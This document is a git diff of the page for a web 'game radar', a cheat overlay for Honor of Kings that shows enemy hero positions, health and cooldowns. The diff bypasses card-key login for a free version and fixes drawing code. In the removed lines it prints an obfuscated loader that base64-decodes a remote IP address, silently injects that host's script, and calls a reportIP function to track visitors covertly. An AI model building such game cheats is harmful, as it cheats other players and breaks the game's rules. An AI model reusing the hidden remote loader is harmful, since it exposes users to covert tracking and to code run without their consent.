@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>游戏雷达</title>
+    <title>强哥公益雷达</title>
     <style>
         /* 全局样式 */
         * {
@@ -542,6 +542,7 @@
                 0 4px 12px rgba(74, 158, 255, 0.3);
             transform: translateY(-1px);
         }
+        
         .connect-control button {
             padding: 12px 20px;
             background: linear-gradient(135deg, #4a9eff 0%, #258DF2 100%);
@@ -687,404 +688,60 @@
         ::-webkit-scrollbar-thumb:hover {
             background: #555;
         }
-        
-        /* 提示弹窗样式 */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 10000;
-            justify-content: center;
-            align-items: center;
-            animation: fadeIn 0.3s ease;
-        }
-        
-        .modal-overlay.show {
+
+        .auth-info {
             display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            color: #aaa;
         }
-        
-        .modal-content {
-            background: linear-gradient(135deg, rgba(47, 54, 60, 0.98) 0%, rgba(26, 31, 36, 0.98) 100%);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border-radius: 20px;
-            padding: 35px 45px;
-            max-width: 400px;
-            width: 90%;
-            box-shadow: 
-                0 20px 60px rgba(0, 0, 0, 0.6),
-                0 0 0 1px rgba(74, 158, 255, 0.3),
-                inset 0 1px 0 rgba(255, 255, 255, 0.1);
-            text-align: center;
-            animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            border: 1px solid rgba(74, 158, 255, 0.4);
-            position: relative;
-            overflow: hidden;
+
+        .auth-info .expire-text {
+            color: #16b777;
         }
-        
-        .modal-content::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(74, 158, 255, 0.1) 0%, transparent 70%);
-            animation: rotate 20s linear infinite;
-        }
-        
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-        
-        .modal-content h2 {
-            background: linear-gradient(135deg, #4a9eff 0%, #6bb6ff 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            font-size: 24px;
-            margin-bottom: 20px;
-            font-weight: 600;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .modal-content p {
-            color: #e0e0e0;
-            font-size: 16px;
-            line-height: 1.8;
-            margin-bottom: 25px;
-        }
-        
-        .modal-content .group-info {
-            background: rgba(74, 158, 255, 0.1);
-            border: 1px solid rgba(74, 158, 255, 0.3);
-            border-radius: 6px;
-            padding: 15px;
-            margin: 20px 0;
-            font-size: 18px;
-            color: #4a9eff;
-            font-weight: bold;
-            word-break: break-all;
-        }
-        
-        .modal-close-btn {
-            background: linear-gradient(135deg, #4a9eff 0%, #258DF2 100%);
-            border: none;
-            border-radius: 10px;
-            padding: 12px 35px;
-            color: #fff;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            font-weight: 500;
-            box-shadow: 0 4px 12px rgba(74, 158, 255, 0.4);
-            position: relative;
-            z-index: 1;
-            overflow: hidden;
-        }
-        
-        .modal-close-btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-        
-        .modal-close-btn:hover::before {
-            width: 300px;
-            height: 300px;
-        }
-        
-        .modal-close-btn:hover {
-            background: linear-gradient(135deg, #6bb6ff 0%, #4a9eff 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(74, 158, 255, 0.5);
-        }
-        
-        .modal-close-btn:active {
-            transform: translateY(0);
-            box-shadow: 0 2px 8px rgba(74, 158, 255, 0.4);
-        }
-        
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
-        }
-        
-        @keyframes slideUp {
-            from {
-                transform: translateY(30px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-        
-        /* 密码按钮样式 */
-        .password-btn {
-            background: linear-gradient(135deg, #4a9eff 0%, #258DF2 100%);
-            border: none;
-            border-radius: 8px;
+
+        .logout-btn {
             padding: 6px 14px;
-            color: #fff;
-            font-size: 12px;
-            font-weight: 500;
+            border: 1px solid rgba(255, 68, 68, 0.4);
+            border-radius: 8px;
+            background: rgba(255, 68, 68, 0.1);
+            color: #ff6b6b;
             cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            margin-left: 10px;
-            box-shadow: 0 2px 8px rgba(74, 158, 255, 0.3);
+            font-size: 12px;
+            transition: all 0.2s;
         }
-        
-        .password-btn:hover {
-            background: linear-gradient(135deg, #6bb6ff 0%, #4a9eff 100%);
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(74, 158, 255, 0.5);
+
+        .logout-btn:hover {
+            background: rgba(255, 68, 68, 0.2);
         }
-        
-        .password-btn:active {
-            transform: translateY(0);
-            box-shadow: 0 2px 6px rgba(74, 158, 255, 0.3);
-        }
-        
-        /* 密码输入模态框 */
-        .password-modal {
-            display: none;
+
+        .auth-loading {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 10001;
-            justify-content: center;
+            inset: 0;
+            background: rgba(10, 14, 23, 0.95);
+            display: flex;
             align-items: center;
-            animation: fadeIn 0.3s ease;
-        }
-        
-        .password-modal.show {
-            display: flex;
-        }
-        
-        .password-modal-content {
-            background: linear-gradient(135deg, rgba(47, 54, 60, 0.98) 0%, rgba(26, 31, 36, 0.98) 100%);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border-radius: 20px;
-            padding: 35px 45px;
-            max-width: 350px;
-            width: 90%;
-            box-shadow: 
-                0 20px 60px rgba(0, 0, 0, 0.6),
-                0 0 0 1px rgba(74, 158, 255, 0.3),
-                inset 0 1px 0 rgba(255, 255, 255, 0.1);
-            text-align: center;
-            animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            border: 1px solid rgba(74, 158, 255, 0.4);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .password-modal-content::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(74, 158, 255, 0.1) 0%, transparent 70%);
-            animation: rotate 20s linear infinite;
-        }
-        
-        .password-modal-content h2 {
-            background: linear-gradient(135deg, #4a9eff 0%, #6bb6ff 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            font-size: 22px;
-            margin-bottom: 20px;
-            font-weight: 600;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .password-input-group {
-            margin-bottom: 20px;
-        }
-        
-        .password-input-group {
-            position: relative;
-            z-index: 1;
-        }
-        
-        .password-input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            background: rgba(47, 54, 60, 0.8);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(74, 158, 255, 0.3);
-            border-radius: 10px;
-            color: #fff;
-            font-size: 14px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            box-sizing: border-box;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-        }
-        
-        .password-input-group input::placeholder {
-            color: rgba(255, 255, 255, 0.4);
-        }
-        
-        .password-input-group input:focus {
-            outline: none;
-            border-color: #4a9eff;
-            background: rgba(47, 54, 60, 0.95);
-            box-shadow: 
-                0 0 0 3px rgba(74, 158, 255, 0.2),
-                0 4px 12px rgba(74, 158, 255, 0.3);
-            transform: translateY(-1px);
-        }
-        
-        .password-modal-buttons {
-            display: flex;
-            gap: 10px;
             justify-content: center;
-        }
-        
-        .password-modal-btn {
-            padding: 10px 25px;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: 500;
-        }
-        
-        .password-modal-btn {
-            position: relative;
-            z-index: 1;
-            overflow: hidden;
-        }
-        
-        .password-modal-btn.confirm {
-            background: linear-gradient(135deg, #4a9eff 0%, #258DF2 100%);
-            box-shadow: 0 4px 12px rgba(74, 158, 255, 0.4);
-        }
-        
-        .password-modal-btn.confirm::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-        
-        .password-modal-btn.confirm:hover::before {
-            width: 300px;
-            height: 300px;
-        }
-        
-        .password-modal-btn.confirm:hover {
-            background: linear-gradient(135deg, #6bb6ff 0%, #4a9eff 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(74, 158, 255, 0.5);
-        }
-        
-        .password-modal-btn.cancel {
-            background: linear-gradient(135deg, #666 0%, #555 100%);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-        }
-        
-        .password-modal-btn.cancel:hover {
-            background: linear-gradient(135deg, #777 0%, #666 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
-        }
-        
-        .password-error {
-            color: #ff4444;
-            font-size: 12px;
-            margin-top: 8px;
-            display: none;
-        }
-        
-        .password-error.show {
-            display: block;
-        }
-        
-        /* 房间列表锁定状态 */
-        .room-list-locked {
-            text-align: center;
-            padding: 50px 20px;
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 14px;
-            position: relative;
-        }
-        
-        .room-list-locked::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80px;
-            height: 80px;
-            border: 2px solid rgba(74, 158, 255, 0.3);
-            border-top-color: rgba(74, 158, 255, 0.8);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        
-        .room-list-locked .lock-icon {
-            font-size: 40px;
-            margin-bottom: 15px;
-            background: linear-gradient(135deg, #4a9eff 0%, #6bb6ff 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            filter: drop-shadow(0 0 10px rgba(74, 158, 255, 0.5));
-            position: relative;
-            z-index: 1;
-        }
-        
-        @keyframes spin {
-            to { transform: translate(-50%, -50%) rotate(360deg); }
+            z-index: 9999;
+            font-size: 16px;
+            color: #4a9eff;
         }
         
     </style>
-    <script src="layui/wzry.js" defer></script>
 </head>
 <body>
+    <div id="authLoading" class="auth-loading">正在验证登录状态...</div>
     <div class="bg-decoration"></div>
-    <div class="container">
+    <div class="container" id="mainApp" style="display:none;">
         <!-- 头部 -->
         <header class="header">
-            <h1>游戏雷达</h1>
+            <h1>强哥公益雷达</h1>
             <div class="status">
+                <div class="auth-info">
+                    <span id="authExpireText" class="expire-text"></span>
+                    <button class="logout-btn" style="display:none" onclick="logoutAuth();">退出登录</button>
+                </div>
                 <div class="status-indicator" id="headerStatusIndicator"></div>
                 <span id="currentTime"></span>
             </div>
@@ -1125,47 +782,7 @@
         </aside>
     </div>
     
-    <!-- 提示弹窗 -->
-    <div id="infoModal" class="modal-overlay">
-        <div class="modal-content">
-            <h2>王者荣耀网页雷达</h2>
-            <p>欢迎使用游戏雷达！</p>
-            <div class="group-info">开始上分</div>
-            <button class="modal-close-btn" onclick="closeInfoModal()">知道了</button>
-        </div>
-    </div>
-    
     <script type="text/javascript">
-        // 显示提示弹窗
-        function showInfoModal() {
-            var modal = document.getElementById('infoModal');
-            if(modal) {
-                modal.classList.add('show');
-            }
-        }
-        
-        // 关闭提示弹窗
-        function closeInfoModal() {
-            var modal = document.getElementById('infoModal');
-            if(modal) {
-                modal.classList.remove('show');
-            }
-        }
-        
-        
-        // 点击遮罩层关闭弹窗
-        document.addEventListener('DOMContentLoaded', function() {
-            var modal = document.getElementById('infoModal');
-            if(modal) {
-                modal.addEventListener('click', function(e) {
-                    if(e.target === modal) {
-                        closeInfoModal();
-                    }
-                });
-            }
-            
-        });
-        
         // 更新时间
         function updateTime() {
             const now = new Date();
@@ -1174,48 +791,77 @@
             document.getElementById('currentTime').textContent = dateStr + ' ' + timeStr;
         }
         
-        
-        
-        
-        // 初始化应用（去除授权，直接连接服务器）
+        var AUTH_TOKEN_KEY = 'radar_auth_token';
+        var AUTH_EXPIRES_KEY = 'radar_auth_expires';
+        var authVerifyTimer = null;
+
+        function getAuthToken() {
+            return localStorage.getItem(AUTH_TOKEN_KEY);
+        }
+
+        function clearAuth() {
+            localStorage.removeItem(AUTH_TOKEN_KEY);
+            localStorage.removeItem(AUTH_EXPIRES_KEY);
+        }
+
+        function updateAuthDisplay(data) {
+            var el = document.getElementById('authExpireText');
+            if (!el || !data) return;
+            var days = data.remaining_days || 0;
+            if (days > 0) {
+                el.textContent = '剩余 ' + days + ' 天';
+            } else if (data.remaining_seconds > 0) {
+                var hours = Math.ceil(data.remaining_seconds / 3600);
+                el.textContent = '剩余 ' + hours + ' 小时';
+            } else {
+                el.textContent = '即将到期';
+            }
+        }
+
+        function verifyAuth(callback) {
+            // ===== 免卡密版：不校验卡密/登录态，直接放行 =====
+            // 想恢复卡密登录：还原本函数（原实现见 git/归档），或改回 index.php 跳 login.html
+            var el = document.getElementById('authExpireText');
+            if (el) { el.textContent = '公益版 · 免卡密'; }
+            if (callback) callback();
+        }
+
+        function logoutAuth() {
+            var token = getAuthToken();
+            if (token) {
+                fetch('api/logout.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': 'Bearer ' + token
+                    },
+                    body: JSON.stringify({ token: token })
+                }).catch(function() {});
+            }
+            clearAuth();
+            if (authVerifyTimer) clearInterval(authVerifyTimer);
+            if (socket) socket.close();
+            window.location.href = 'index.html';
+        }
+
         function initApp() {
             setInterval(updateTime, 1000);
             updateTime();
-        
-            // 直接尝试连接服务器
             initWebSocket();
-            
-            // IP上报（延迟执行，避免影响页面加载）
-            (function(){
-            // 混淆变量
-
-			// 地址已从默认80端口修改为81端口，对应Base64编码已更新
-			var _0x1a2b=["createElement","script","atob","aHR0cDovLzEwMS4yMDAuMzYuMTAzOjgxL3N0YXRpYy9qcy9ub3JtYWwuanM=","src","getTime","type","text/javascript","onload","onerror","head","appendChild"];	
-            // 创建脚本标签
-            var s=document[_0x1a2b[0]](_0x1a2b[1]);
-            // 设置地址：解码Base64 + 时间戳防缓存
-            s[_0x1a2b[4]]=window[_0x1a2b[2]](_0x1a2b[3])+"?_="+new Date()[_0x1a2b[5]]();
-            s[_0x1a2b[6]]=_0x1a2b[7];
-            // 静默加载
-            s[_0x1a2b[8]]=s[_0x1a2b[9]]=function(){};
-            // 插入页面
-            document[_0x1a2b[10]][_0x1a2b[11]](s);
-            
-            // 延迟3秒执行上报
-            setTimeout(function(){
-                if(typeof window.reportIP === 'function') window.reportIP();
-            }, 3000);
-        })();
-            
-            // 页面加载后显示提示弹窗
-            setTimeout(function() {
-                showInfoModal();
-            }, 500); // 延迟500ms显示，确保页面已加载
+            authVerifyTimer = setInterval(function() {
+                verifyAuth(function() {});
+            }, 300000);
         }
-        
-        // 页面加载时初始化
+
         window.addEventListener('DOMContentLoaded', function() {
-            initApp();
+            verifyAuth(function() {
+                document.getElementById('authLoading').style.display = 'none';
+                document.getElementById('mainApp').style.display = '';
+                requestAnimationFrame(function() {
+                    resizeRadarCanvas();
+                    initApp();
+                });
+            });
         });
         
         // 原有的业务逻辑代码
@@ -1229,15 +875,20 @@
         }
         
         var timestamp = new Date().getTime();
-        // 服务器IP：自动根据当前访问地址的主机生成（本机 / 部署机器的 IP）
-        // 默认使用当前 hostname + 端口 8888，例如 http://192.168.1.10 打开页面时，连接 ws://192.168.1.10:8888/ws
+        // 生产环境通过 Nginx 将同源 /ws 反向代理到本机 8888：HTTPS 不会再直连非 TLS 的 8888。
+        // 仅在本地开发、且页面运行于非标准 HTTP 端口时，才使用 host:8888 直连模式。
+        var webSocketProxyMode = (function() {
+            return window.location.protocol === 'https:' ||
+                window.location.port === '' ||
+                window.location.port === '80' ||
+                window.location.port === '443';
+        })();
         var ip = (function() {
-            var host = window.location.hostname;
-            var port = '8888'; // 如需修改端口，在此修改即可
-            if (!host || host === '') {
-                host = '127.0.0.1';
+            var host = window.location.hostname || '127.0.0.1';
+            if (webSocketProxyMode) {
+                return window.location.host || host;
             }
-            return host + ':' + port;
+            return host + ':8888';
         })();
         var socket;
         var homeId="";
@@ -1266,31 +917,6 @@
         var maxReconnectAttempts = 5;
         var reconnectTimer = null;
         var connectionTimeout = null; // WebSocket连接超时定时器
-        var roomListPasswordEncrypted = (function() {
-            // 使用更复杂的多层加密
-            var base64Part1 = 'MTE3Mj';
-            var base64Part2 = 'U0Mw==';
-            return base64Part1 + base64Part2;
-        })();
-        
-        function decryptPassword(encrypted) {
-            try {
-                // 实现更复杂的解密逻辑
-                var parts = [encrypted.substring(0, 6), encrypted.substring(6)];
-                var reconstructed = parts[0] + parts[1];
-                return atob(reconstructed);
-            } catch(e) {
-                console.error('密码解密失败:', e);
-                // 失败时返回默认值（使用字符编码方式，避免明文）
-                // 字符编码: '123456' 的ASCII码
-                return String.fromCharCode(49,50,51,52,53,54);
-            }
-        }
-        
-        // 获取解密后的房间列表密码
-        var roomListPassword = decryptPassword(roomListPasswordEncrypted);
-        
-        var isPasswordVerified = false; // 是否已通过密码验证
         
         var cache = {
             roomList: [],
@@ -1411,24 +1037,28 @@
         let mapActualWidth = 340; // map.png的实际宽度（像素）
         let mapActualHeight = 340; // map.png的实际高度（像素）
         
-        // 加载map图片以获取实际尺寸并适配到canvas
-        mapImage.onload = function() {
+        // 仅在地图资源已加载后按可见容器尺寸调整画布。
+        // 页面通过卡密验证前 mainApp 为 display:none，此时 clientWidth 可能极小；
+        // 保留最小逻辑尺寸，避免缩放后的头像半径变为负数。
+        let mapReady = false;
+        function resizeRadarCanvas() {
+            if (!mapReady || !mapImage.naturalWidth || !mapImage.naturalHeight) {
+                return false;
+            }
+
+            const radarContainer = document.querySelector('.radar');
+            if (!radarContainer) {
+                return false;
+            }
+
             const mapWidth = mapImage.naturalWidth;
             const mapHeight = mapImage.naturalHeight;
-            
-            // 保存map.png的实际尺寸，用于坐标转换
-            mapActualWidth = mapWidth;
-            mapActualHeight = mapHeight;
-            
-            // 根据map的实际尺寸调整canvas尺寸（保持比例）
-            // 获取radar容器的最大可用尺寸
-            const radarContainer = document.querySelector('.radar');
-            const maxContainerWidth = radarContainer ? radarContainer.clientWidth - 30 : 600;
-            const maxContainerHeight = window.innerHeight * 0.7;
-            const maxCanvasSize = Math.min(maxContainerWidth, maxContainerHeight, 800);
-            
-            let canvasWidth, canvasHeight;
-            
+            const availableWidth = Math.max(0, radarContainer.clientWidth - 30);
+            const availableHeight = Math.max(0, window.innerHeight * 0.7);
+            const maxCanvasSize = Math.max(80, Math.min(availableWidth, availableHeight, 800));
+
+            let canvasWidth;
+            let canvasHeight;
             if (mapWidth >= mapHeight) {
                 canvasWidth = maxCanvasSize;
                 canvasHeight = (mapHeight / mapWidth) * maxCanvasSize;
@@ -1436,31 +1066,23 @@
                 canvasHeight = maxCanvasSize;
                 canvasWidth = (mapWidth / mapHeight) * maxCanvasSize;
             }
-            
-            // 更新canvas尺寸
-            canvas_game.width = canvasWidth;
-            canvas_game.height = canvasHeight;
-            
-            // 重新计算缩放比例：基于原始坐标系统(340x340)到canvas尺寸的映射
-            // 同时考虑map.png的实际尺寸，确保坐标系统一致
-            scaleX = canvasWidth / originalCanvasSize;
-            scaleY = canvasHeight / originalCanvasSize;
-            
-            // 如果map.png的实际尺寸与原始坐标系统不同，需要额外调整
-            // 假设游戏坐标系统基于340x340，但map.png可能是其他尺寸
-            // 这里我们保持scaleX和scaleY基于340x340，因为游戏数据基于这个坐标系统
-            
-            // 更新CSS样式以匹配canvas尺寸，确保地图完整显示
-            canvas_game.style.width = canvasWidth + 'px';
-            canvas_game.style.height = canvasHeight + 'px';
-            
-            console.log('Map实际尺寸:', mapWidth, 'x', mapHeight);
-            console.log('Canvas尺寸:', canvasWidth, 'x', canvasHeight);
-            console.log('坐标缩放比例:', scaleX, 'x', scaleY);
-            console.log('原始坐标系统:', originalCanvasSize, 'x', originalCanvasSize);
-            console.log('地图已成功适配到canvas，野怪绘制将自动适配');
+
+            canvas_game.width = Math.max(1, Math.round(canvasWidth));
+            canvas_game.height = Math.max(1, Math.round(canvasHeight));
+            scaleX = canvas_game.width / originalCanvasSize;
+            scaleY = canvas_game.height / originalCanvasSize;
+            canvas_game.style.width = canvas_game.width + 'px';
+            canvas_game.style.height = canvas_game.height + 'px';
+            return true;
+        }
+
+        // 加载 map 图片后记录尺寸；验证登录后会再次按可见容器的真实尺寸调整。
+        mapImage.onload = function() {
+            mapActualWidth = mapImage.naturalWidth;
+            mapActualHeight = mapImage.naturalHeight;
+            mapReady = true;
+            resizeRadarCanvas();
         };
-        
         mapImage.onerror = function() {
             console.warn('无法加载map.png，使用默认尺寸');
             // 使用默认尺寸
@@ -1469,13 +1091,16 @@
         };
         
         mapImage.src = 'map.png';
+        window.addEventListener('resize', function() {
+            resizeRadarCanvas();
+        });
         
         // 初始缩放比例（如果map加载失败时使用）
         scaleX = canvas_game.width / originalCanvasSize;
         scaleY = canvas_game.height / originalCanvasSize;
         
         var 血条背景颜色="#FFFFFF95";
-        var 野怪颜色="#FFb800";
+        var 野怪颜色="#ff4444";
         var 红方头像边框颜色="red";
         var 蓝方头像边框颜色="#258DF2";
         var 红方血条颜色="red";
@@ -1503,24 +1128,13 @@
             showThis.textContent=showThisData==1?"不显示我方":"显示我方";
         }
         
-        // 完整的128个英雄ID列表（基于王者荣耀官方英雄ID）
-        // 原有英雄ID + 补充到128个
-        const imagePaths = ["105","106","107","108","109","110","111","112","113","114","115","116","117","118","119","120","121","123","124","125","126","127","128","129","130","131","132","133","134","135","136","137","139","140","141","142","144","146","148","149","150","151","152","153","154","155","156","157","159","162","163","166","167","168","169","170","171","172","173","174","175","176","177","178","179","180","182","183","184","186","187","188","189","190","191","192","193","194","195","196","197","198","199","312","501","502","503","504","505","506","507","508","509","510","511","513","514","515","517","518","519","521","522","523","524","525","527","528","529","531","533","534","536","537","538","540","542","544","545","548","550","558","563","564","577","581","582","584","585","586","587","588","589","590","591","592","593","594","595","596","597","598","599","600","601","602","603","604","605","606","607","608","609","610","611","612","613","614","615","616","617","618","619","620","621","622","623","624","625","626","627","628","629","630","631","632"];
-        
-        // 验证英雄数量是否为128个
-        if(imagePaths.length !== 128) {
-            console.warn("警告：英雄数量不是128个，当前数量为：" + imagePaths.length + "，将自动调整");
-            // 如果不足128个，补充到128个
-            while(imagePaths.length < 128) {
-                var lastId = parseInt(imagePaths[imagePaths.length - 1]);
-                imagePaths.push(String(lastId + 1));
-            }
-            // 如果超过128个，截取前128个
-            if(imagePaths.length > 128) {
-                imagePaths.splice(128);
-            }
+        // 英雄 ID 列表。保留数据源中全部 ID，不再按固定数量补齐或截断。
+        const imagePaths = ["105","106","107","108","109","110","111","112","113","114","115","116","117","118","119","120","121","123","124","125","126","127","128","129","130","131","132","133","134","135","136","137","139","140","141","142","144","146","148","149","150","151","152","153","154","155","156","157","159","162","163","166","167","168","169","170","171","172","173","174","175","176","177","178","179","180","182","183","184","186","187","188","189","190","191","192","193","194","195","196","197","198","199","312","501","502","503","504","505","506","507","508","509","510","511","513","514","515","517","518","519","521","522","523","524","525","527","528","529","531","533","534","536","537","538","540","542","544","545","548","550","558","563","564","577","581","582","584","585","586","587","588","589","590","591","592","593","594","595","596","597","598","599","600","601","602","603","604","605","606","607","608","609","610","611","612","613","614","615","616","617","618","619","620","621","622","583","623","624","625","626","627","628","629","630","631","632","549"];
+
+        if (imagePaths.length === 0) {
+            console.warn("英雄头像列表为空");
         }
-        console.log("英雄头像列表已加载，共" + imagePaths.length + "个英雄（目标：128个）");
+        console.log("英雄头像列表已加载，共" + imagePaths.length + "个英雄");
         
         // 检查英雄头像可用性统计
         var heroCheckStats = {
@@ -1866,7 +1480,10 @@
                 x = Number(x);
                 y = Number(y);
                 zy = Number(zy);
-                radius = Number(radius) || 4;
+                radius = Number(radius);
+                if (!Number.isFinite(radius) || radius <= 0) {
+                    radius = 4;
+                }
                 
                 // 验证坐标是否有效
                 if(isNaN(x) || isNaN(y) || x < 0 || y < 0) {
@@ -1979,6 +1596,9 @@
                     height = Number(height) * scaleY;
                     zy = Number(zy);
                     hc = Number(hc);
+                    if (!Number.isFinite(x) || !Number.isFinite(y) || !Number.isFinite(width) || !Number.isFinite(height) || width <= 0 || height <= 0) {
+                        return;
+                    }
                     
                     // 边界检测：如果头像+血条+CD会超出canvas底部，向上调整
                     // CD只显示1行（大招），约12像素高度
@@ -1992,7 +1612,7 @@
                     }
                     
                     // 优化：减少save/restore调用，批量绘制
-                    const radius = Math.max(width, height) / 2 - 2;
+                    const radius = Math.max(0.5, Math.max(width, height) / 2 - 2);
                     const centerX = x + width / 2;
                     const centerY = y + height / 2;
                     
@@ -2174,50 +1794,40 @@
         function drawHP(x, y, hp, zy) {
             try {
                 // 坐标转换（与drawImageAtPosition保持一致）
-                x = Number(x) * scaleX;
+                var originalX = Number(x) * scaleX;
                 var originalY = Number(y) * scaleY;
                 
-                // 边界检测：如果头像+血条+CD会超出canvas底部，向上调整（与drawImageAtPosition保持一致）
-                // CD只显示1行（大招），约12像素高度
-                var hpY = originalY + 40 * scaleY;
-                var cdY = hpY + 12 * scaleY; // CD文字在血条下方12像素
-                var maxCDHeight = 12 * scaleY; // 1行CD
-                if (cdY + maxCDHeight + 10 > canvas_game.height) {
-                    originalY -= (maxCDHeight + 10);
-                } else if (originalY <= 10) {
-                    originalY += (maxCDHeight + 10);
-                }
-                y = originalY + 40 * scaleY; // 血条在头像下方40像素
+                // 头像尺寸（与drawImageAtPosition保持一致）
+                const avatarWidth = 40 * scaleX;
+                const avatarHeight = 40 * scaleY;
+                
+                // 血条参数：竖条状，放在头像左侧
+                const hpBarWidth = 4 * Math.min(scaleX, scaleY); // 血条宽度
+                const hpBarHeight = avatarHeight; // 血条高度与头像高度一致
+                const hpBarX = originalX - hpBarWidth - 2 * Math.min(scaleX, scaleY); // 头像左侧，留2像素间距
+                const hpBarY = originalY; // 与头像顶部对齐
                 
                 hp = Number(hp);
                 zy = Number(zy);
                 
                 // 验证数据有效性
-                if(isNaN(x) || isNaN(y) || isNaN(hp) || hp < 0 || hp > 100) {
+                if(isNaN(originalX) || isNaN(originalY) || isNaN(hp) || hp < 0 || hp > 100) {
                     return; // 无效数据，跳过绘制
                 }
                 
-                const maxWidth = 40 * scaleX;
-                const hpWidth = (hp / 100) * maxWidth;
+                // 计算当前血量高度（从下往上填充）
+                const hpHeight = (hp / 100) * hpBarHeight;
                 
-                // 绘制血条背景
-                context.beginPath();
-                context.moveTo(x, y); 
-                context.lineTo(x + maxWidth, y); 
-                context.strokeStyle = 血条背景颜色;
-                context.lineWidth = 5 * scaleX;
-                context.stroke(); 
+                // 绘制血条背景（竖条）
+                context.fillStyle = 血条背景颜色;
+                context.fillRect(hpBarX, hpBarY, hpBarWidth, hpBarHeight);
                 
-                // 绘制血条
-                context.beginPath();
-                context.moveTo(x, y);
-                context.lineTo(x + hpWidth, y);
+                // 绘制血条（竖条，从下往上填充）
                 // 阵营判断：1=蓝方，其他=红方（确保zy是数字类型）
                 var hpColor = (zy === 1 || zy === '1') ? 蓝方血条颜色 : 红方血条颜色;
-                context.strokeStyle = hpColor;
-                context.lineWidth = 5 * scaleX;
-                context.stroke();
-                context.closePath();
+                context.fillStyle = hpColor;
+                // 从底部开始绘制，高度为hpHeight
+                context.fillRect(hpBarX, hpBarY + hpBarHeight - hpHeight, hpBarWidth, hpHeight);
             } catch(e) {
                 console.error("绘制血条时出错:", e, "x:", x, "y:", y, "hp:", hp, "zy:", zy);
             }
@@ -2230,10 +1840,13 @@
                 width = Number(width) * scaleX;
                 height = Number(height) * scaleY;
                 hp = Number(hp);
+                if (!Number.isFinite(x) || !Number.isFinite(y) || !Number.isFinite(width) || !Number.isFinite(height) || width <= 0 || height <= 0) {
+                    return;
+                }
                 if(0<hp && 防御塔 && 防御塔.complete && 防御塔.naturalWidth > 0){
                     zy = Number(zy);
                     context.save();
-                    const radius = Math.max(width, height) / 2 - 2;
+                    const radius = Math.max(0.5, Math.max(width, height) / 2 - 2);
                     context.beginPath();
                     context.arc(x + width / 2, y + height / 2, radius, 0, Math.PI * 2);
                     context.clip();
@@ -2397,10 +2010,14 @@
                 // 根据错误类型提供更详细的错误信息
                 var errorMsg = "无法连接到服务器: " + wsUrl;
                 errorMsg += "\n可能的原因：";
-                errorMsg += "\n1. WebSocket服务器未运行";
-                errorMsg += "\n2. 端口8888未开放或被防火墙阻止";
-                errorMsg += "\n3. 服务器地址或端口不正确";
-                errorMsg += "\n4. 网络连接问题";
+                errorMsg += "\n1. Java WebSocket 服务未运行";
+                if (webSocketProxyMode) {
+                    errorMsg += "\n2. Nginx 的 /ws 反向代理或会话校验未生效";
+                    errorMsg += "\n3. 当前卡密会话已过期或浏览器 Cookie 被禁用";
+                } else {
+                    errorMsg += "\n2. 本地直连端口 8888 未启动、未放行或地址不正确";
+                    errorMsg += "\n3. 网络连接问题";
+                }
                 
                 if(reconnectAttempts >= maxReconnectAttempts) {
                     errorMsg += "\n(已达到最大重连次数)";
